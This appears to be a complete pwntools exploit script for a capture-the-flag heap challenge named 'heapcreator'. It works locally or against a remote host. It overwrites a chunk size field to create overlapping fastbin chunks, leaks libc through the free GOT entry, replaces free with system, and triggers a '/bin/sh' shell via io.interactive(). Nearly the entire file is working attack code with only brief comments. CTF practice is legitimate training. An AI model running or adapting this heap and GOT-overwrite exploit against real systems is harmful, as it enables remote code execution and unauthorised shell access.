from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './heapcreator'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        print('pid: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sa(b'choice :', str(idx).encode())


def create(sz, content):
    opt(1)
    sa(b'Heap : ', str(sz).encode())
    sa(b'of heap:', content)

def edit(idx, content):
    opt(2)
    sa(b'Index :', str(idx).encode())
    sa(b'of heap : ', content)

def show(idx):
    opt(3)
    sa(b'Index :', str(idx).encode())

def delete(idx):
    opt(4)
    sa(b'Index :', str(idx).encode())

def exp():
    create(0x18, b'0')
    create(0x18, b'1')
    # make heaparray[1]'s chunk.size=0x41, extend it to overlap with the content chunk.
    edit(0, b'/bin/sh\0'.ljust(0x18, b'a') + b'\x41')
    delete(1)
    # now, we have 2 fastbin: one size in 0x20 bytes, the other in 0x40, and the are overlapped.
    #            ---------
    #          / |       |
    #          | |       |
    #          | |       |
    #          | |       |
    #   0x40   < |-------| \
    #  content | |       | |
    #          | |       | > 0x20: the heap info
    #          | |       | | 
    #          \ |-------| /
    
    # allocate a 0x40 chunk as the content, so the malloc(0x10) for the heap record
    # will be higher 0x20 bytes in the content chunk, that is, we can eidt the 
    # heaparray[1].pBuf by editing heaparray[1].
    create(0x30, flat({0x20: 0x30, 0x28:exe.got.free}))
    show(1)
    ru(b'Content : ')
    libc.address = u64(r(6).ljust(8, b'\0')) - libc.sym.free
    log.success('libc: %#x' % libc.address)

    edit(1, p64(libc.sym.system))

    delete(0)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()